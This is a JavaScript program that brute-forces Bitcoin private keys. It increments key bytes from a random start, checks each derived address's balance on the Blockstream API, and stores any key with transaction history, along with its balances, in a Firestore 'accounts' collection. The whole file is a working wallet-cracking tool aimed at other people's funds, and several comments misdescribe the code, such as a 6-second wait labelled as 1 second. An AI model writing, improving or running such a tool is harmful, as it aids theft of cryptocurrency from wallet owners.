import * as bitcoin from 'bitcoinjs-lib';
import * as ECPairFactory from 'ecpair';
import * as ecc from 'tiny-secp256k1';
import axios from 'axios';
import crypto from 'crypto';
import dotenv from 'dotenv'

import { initializeApp } from "firebase/app"
import { getFirestore, collection, addDoc } from "firebase/firestore"
import { time } from 'console';

// Simple synchronous function to wait for a specified number of milliseconds
function waitSync(ms) {
    const end = Date.now() + ms;
    while (Date.now() < end) {
        // Busy-wait loop
    }
}


dotenv.config();

const firebaseConfig = {
  apiKey: process.env.FIREBASE_API_KEY,
  authDomain: process.env.FIREBASE_AUTH_DOMAIN,
  projectId: process.env.FIREBASE_PROJECT_ID,
  storageBucket: process.env.FIREBASE_STORAGE_BUCKET,
  messagingSenderId: process.env.FIREBASE_MESSAGING_SENDER_ID,
  appId: process.env.FIREBASE_APP_ID
};

// Initialize Firebase
const app = initializeApp(firebaseConfig)


// Initialize Cloud Firestore and get a reference to the service
const db = getFirestore(app)

const writeData = async (data) => {
  try {
    // Add a new document with a generated ID
    const docRef = await addDoc(collection(db, "accounts"), data)
    console.log("Document written with ID: ", docRef.id)
  }
  catch (e) {
    console.error("Error adding document: ", e)
  }
}


// Initialize ECPair with tiny-secp256k1
const ECPair = ECPairFactory.ECPairFactory(ecc);

// Function to import BTC wallet using private key and check balance
async function importWalletAndCheckBalance(privateKeyWIF) {
    try {
        // Decode the private key
        const keyPair = ECPair.fromWIF(privateKeyWIF);
        const { address } = bitcoin.payments.p2pkh({ pubkey: keyPair.publicKey });

        // Fetch balance from a public API (e.g., Blockstream)
        const response = await axios.get(`https://blockstream.info/api/address/${address}`);
        return response.data;
    } catch (error) {
        console.error('Error importing wallet or fetching balance:', error.message);
        throw error;
    }
}

// Function to generate a random BTC private key as a string
function generatePrivateKeyString() {
    try {
        // Generate a random key pair
        const keyPair = ECPair.makeRandom();
        const privateKeyWIF = keyPair.toWIF();

        return privateKeyWIF; // Return the private key as a string
    } catch (error) {
        console.error('Error generating private key:', error.message);
        throw error;
    }
}

// Function to generate a private key specifically for brute force by using 32 random bytes and creating a key pair from the private key
function generatePrivateKeyForBruteForce() {
    try {
        // Generate a random private key for brute force
        const randomBytes = crypto.randomBytes(32); // Generate 32 random bytes
        return randomBytes; // Return the private key as a string
    } catch (error) {
        console.error('Error generating private key for brute force:', error.message);
        throw error;
    }
}

function generatePrivateKeyTextFromBytes(bytes) {
    try {
        // Generate a random private key for brute force
        const keyPair = ECPair.fromPrivateKey(bytes);
        const privateKeyHex = keyPair.toWIF();

        return privateKeyHex; // Return the private key as a hex string
    } catch (error) {
        console.error('Error generating private key text from bytes:', error.message);
        throw error;
    }
}

// Function to increment a byte array
function incrementByteArray(byteArray) {
    for (let i = byteArray.length - 1; i >= 0; i--) {
        if (byteArray[i] < 255) {
            byteArray[i]++;
            return byteArray;
        } else {
            byteArray[i] = 0;
        }
    }

    return 0; // Return 0 if all bytes have been incremented (overflow)
}

function bruteForce(privateKeyBytes) {
    const privateKeyWIF = generatePrivateKeyTextFromBytes(privateKeyBytes); // Convert bytes to hex string

    importWalletAndCheckBalance(privateKeyWIF).then(result => {
        waitSync(6000); // Wait for 1 second before the next attempt
        console.log(`Generated Private Key Byte: ${Buffer.from(privateKeyBytes).toString('hex')}`);
        console.log(`Generated Private Key Text: ${privateKeyWIF}`);
        const balance1 = result.chain_stats.funded_txo_sum - result.chain_stats.spent_txo_sum;
        const balance2 = result.mempool_stats.funded_txo_sum - result.mempool_stats.spent_txo_sum;
        
        if (result.chain_stats.tx_count > 0 || result.mempool_stats.tx_count > 0) {
            console.log('Wallet Info:', result);
            writeData({
                key: privateKeyWIF,
                address: result.address,
                balance1: balance1 / 1e8,
                tx_count1: result.chain_stats.tx_count,
                balance2: balance2 / 1e8,
                tx_count2: result.mempool_stats.tx_count,
                timestamp: new Date().toISOString()
            });
        }
        privateKeyBytes = incrementByteArray(privateKeyBytes);

        if (privateKeyBytes !== 0) {
            bruteForce(privateKeyBytes); // Continue brute forcing with the next private key
        }
    }).catch(err => {
        console.error('Failed to fetch wallet info:', err);
        bruteForce(privateKeyBytes); // Continue brute forcing with the next private key
    });
    
}

// Function to convert a byte array to a Buffer
function byteArrayToBuffer(byteArray) {
    return Buffer.from(byteArray);
}

let privateKeyBytes = generatePrivateKeyForBruteForce(); // Generate private key bytes
// let privateKeyBytes = byteArrayToBuffer([0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1]) // Generate private key bytes
bruteForce(privateKeyBytes); // Start brute forcing with the generated private key bytes
